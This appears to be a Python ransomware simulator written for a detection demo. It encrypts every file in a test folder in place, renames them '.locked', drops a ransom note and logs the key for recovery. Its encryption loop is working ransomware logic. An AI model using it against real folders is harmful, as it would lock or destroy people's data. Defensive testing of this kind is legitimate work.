# simulator.py — Safe Ransomware Simulator (Red Team Module)

import os
import time
import json
import math
import threading
from cryptography.fernet import Fernet

# ──────────────────────────────────────────────
# CONFIGURATION
# ──────────────────────────────────────────────
TARGET_FOLDER = "test_folder"
METRICS_FILE  = "logs/metrics.json"
DELAY_BETWEEN = 1.5   # seconds between each file encryption (realistic pacing)
RANSOM_NOTE   = "READ_ME.txt"

# Shared state (read by dashboard)
attack_metrics = {
    "status": "idle",
    "start_time": None,
    "stop_time": None,
    "files_encrypted": 0,
    "total_files": 0,
    "encryption_key": None,
    "encrypted_files": []
}

_stop_event = threading.Event()


def generate_key():
    """Generate a new Fernet encryption key."""
    return Fernet.generate_key()


def encrypt_file(filepath: str, fernet: Fernet) -> dict:
    """
    Encrypts a single file in place.
    Returns a dict with file info for metrics.
    """
    with open(filepath, "rb") as f:
        original_data = f.read()

    encrypted_data = fernet.encrypt(original_data)

    # Overwrite file with encrypted data
    with open(filepath, "wb") as f:
        f.write(encrypted_data)

    # Rename: add .locked extension
    new_path = filepath + ".locked"
    os.rename(filepath, new_path)

    # Calculate entropy of encrypted file
    entropy = calculate_entropy(encrypted_data)

    return {
        "original": os.path.basename(filepath),
        "encrypted": os.path.basename(new_path),
        "entropy": round(entropy, 4),
        "size_bytes": len(encrypted_data)
    }


def calculate_entropy(data: bytes) -> float:
    """Compute Shannon entropy of byte data."""
    if not data:
        return 0.0
    freq = {}
    for byte in data:
        freq[byte] = freq.get(byte, 0) + 1
    total = len(data)
    entropy = 0.0
    for count in freq.values():
        p = count / total
        if p > 0:
            entropy -= p * math.log2(p)
    return entropy


def drop_ransom_note():
    """Creates a fake ransom note in the target folder."""
    note_path = os.path.join(TARGET_FOLDER, RANSOM_NOTE)
    with open(note_path, "w") as f:
        f.write("""
╔══════════════════════════════════════════════════════╗
║           YOUR FILES HAVE BEEN ENCRYPTED             ║
╠══════════════════════════════════════════════════════╣
║                                                      ║
║  All your documents, photos, and databases have      ║
║  been encrypted with AES-256 encryption.             ║
║                                                      ║
║  To recover your files, send 0.5 BTC to:             ║
║  1A2b3C4d5E6f7G8h9I0jK1L2m3N4o5P6q7R                ║
║                                                      ║
║  ⚠️  THIS IS A SIMULATION FOR ACADEMIC PURPOSES ⚠️   ║
║       No real files were harmed.                     ║
╚══════════════════════════════════════════════════════╝
""")
    print(f"[!] Ransom note dropped: {note_path}")


def save_metrics():
    """Save current attack metrics to JSON for dashboard."""
    os.makedirs("logs", exist_ok=True)
    with open(METRICS_FILE, "w") as f:
        json.dump(attack_metrics, f, indent=2)


def run_simulator():
    """Main ransomware simulation loop."""
    global attack_metrics
    _stop_event.clear()

    # Collect all target files (exclude already locked and ransom note)
    all_files = [
        os.path.join(TARGET_FOLDER, f)
        for f in os.listdir(TARGET_FOLDER)
        if not f.endswith(".locked") and f != RANSOM_NOTE
    ]

    if not all_files:
        print("[!] No files to encrypt. Run create_test_files.py first.")
        return

    # Generate encryption key
    key = generate_key()
    fernet = Fernet(key)

    attack_metrics["status"]         = "running"
    attack_metrics["start_time"]     = time.strftime("%Y-%m-%d %H:%M:%S")
    attack_metrics["total_files"]    = len(all_files)
    attack_metrics["files_encrypted"] = 0
    attack_metrics["encryption_key"] = key.decode()
    attack_metrics["encrypted_files"] = []
    save_metrics()

    print(f"\n[*] Ransomware Simulator STARTED")
    print(f"[*] Target: {TARGET_FOLDER}/ ({len(all_files)} files)")
    print(f"[*] Key: {key.decode()[:20]}...\n")

    for filepath in all_files:
        if _stop_event.is_set():
            print("[!] Simulator forcefully stopped by detection engine.")
            break

        print(f"[+] Encrypting: {os.path.basename(filepath)}")
        file_info = encrypt_file(filepath, fernet)
        attack_metrics["files_encrypted"] += 1
        attack_metrics["encrypted_files"].append(file_info)
        save_metrics()

        time.sleep(DELAY_BETWEEN)  # Realistic pacing

    drop_ransom_note()
    attack_metrics["status"]    = "completed"
    attack_metrics["stop_time"] = time.strftime("%Y-%m-%d %H:%M:%S")
    save_metrics()

    print(f"\n[*] Simulation COMPLETE. {attack_metrics['files_encrypted']} files encrypted.")
    print(f"[*] Encryption key saved to logs/metrics.json (for recovery demo)")


def stop_simulator():
    """Signal the simulator to stop (called by detection engine)."""
    _stop_event.set()
    attack_metrics["status"] = "stopped_by_detection"
    save_metrics()
    print("\n[ALERT] Simulator STOPPED by detection engine!")
